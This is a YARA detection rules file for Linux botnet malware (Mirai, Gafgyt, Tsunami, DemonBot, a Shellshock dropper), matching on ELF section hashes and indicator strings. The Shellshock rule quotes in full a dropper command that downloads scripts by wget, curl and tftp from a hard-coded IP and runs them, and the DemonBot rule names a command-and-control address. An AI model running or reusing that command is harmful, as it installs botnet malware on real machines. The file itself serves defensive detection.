import "elf"
import "hash"
include "rules/commons.yar"


rule Mirai_1 {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Detect some Mirai's variants including Gafgyt and Tsunami variants (named by ClamAV) using section hash"
  condition:
    is_elf and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "b748e0aa34cc3bb4dcf0f803be00e8ae"
    )
}

rule Mirai_2 {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Detect some Mirai's variants (named by ClamAV) using section hash"
  condition:
    is_elf and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "90d8eebc2a34162c49ec31cfc660cec1"
    )
}

rule Mirai_Gafgyt {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Detect some Mirai's variants including Gafgyt variants (named by ClamAV) using section hash"
  condition:
    is_elf and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "68dd3bd106aab3e99d9a65e4f9bfa7f1" or
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "a4b1a9d3f3622ccb54e615de8005f87f"
    )
}

rule Mirai_Tsunami
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Gafgyt-Jm (Avast named) or Tsunami Botnet (FireEye and other), 1 backdoor and 1 used for Dirtycow exploit"
  condition:
    is_elf and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "a7b6569072c6f43a2072b8ef906a2bf9"
    )
}

rule Mirai_DemonBot
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Mirai's variant DemonBot"
    reference = "https://otx.alienvault.com/malware/Backdoor:Linux%2FDemonBot/fileSamples"
    date = "12/11/2021"
    target = "File, memory"
  strings:
    $cc = "54.38.218.178"
    $file_str = "/proc/net/route"
    $str_1 = "PozHlpiND4xPDPuGE6tq"
    $str_2 = "tg57YSAcuvy2hdBlEWMv"
    $str_3 = "VaDp3Vu5m5bKcfCU96RX"
    $str_4 = "UBWcPjIZOdZ9IAOSZAy6"
    $str_5 = "JezacHw4VfzRWzsglZlF"
    $str_6 = "3zOWSvAY2dn9rKZZOfkJ"
    $str_7 = "oqogARpMjAvdjr9Qsrqj"
    $str_8 = "yQAkUvZFjxExI3WbDp2g"
    $str_9 = "35arWHE38SmV9qbaEDzZ"
    $str_10 = "kKbPlhAwlxxnyfM3LaL0"
    $str_11 = "a7pInUoLgx1CPFlGB5JF"
    $str_12 = "yFnlmG7bqbW682p7Bzey"
    $str_13 = "S1mQMZYF6uLzzkiULnGF"
    $str_14 = "jKdmCH3hamvbN7ZvzkNA"
    $str_15 = "bOAFqQfhvMFEf9jEZ89M"
    $str_16 = "VckeqgSPaAA5jHdoFpCC"
    $str_17 = "CwT01MAGqrgYRStHcV0X"
    $str_18 = "72qeggInemBIQ5uJc1jQ"
    $str_19 = "zwcfbtGDTDBWImROXhdn"
  condition:
    ($cc and $file_str) or any of ($str*)
}

rule Shellshock {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Shellshock.A"
    reference = "https://otx.alienvault.com/indicator/file/88ab21215c71fe88b04ab7b0e6a882a65c25df5aed79232f495f4bdb4c9a3600"
    date = "12/11/2021"
    target = "File, memory"
  strings:
    $addr_1 = "http://195.58.39.37/bins.sh"
    $addr_2 = "185.172.110.209"
    $addr_3 = "195.58.39.37"
    $str_1 = "/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'"
    $str_2 = "cd /tmp; wget http://195.58.39.37/bins.sh || curl -O http://195.58.39.37/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 195.58.39.37 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 195.58.39.37; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh"
  condition:
    any of them
}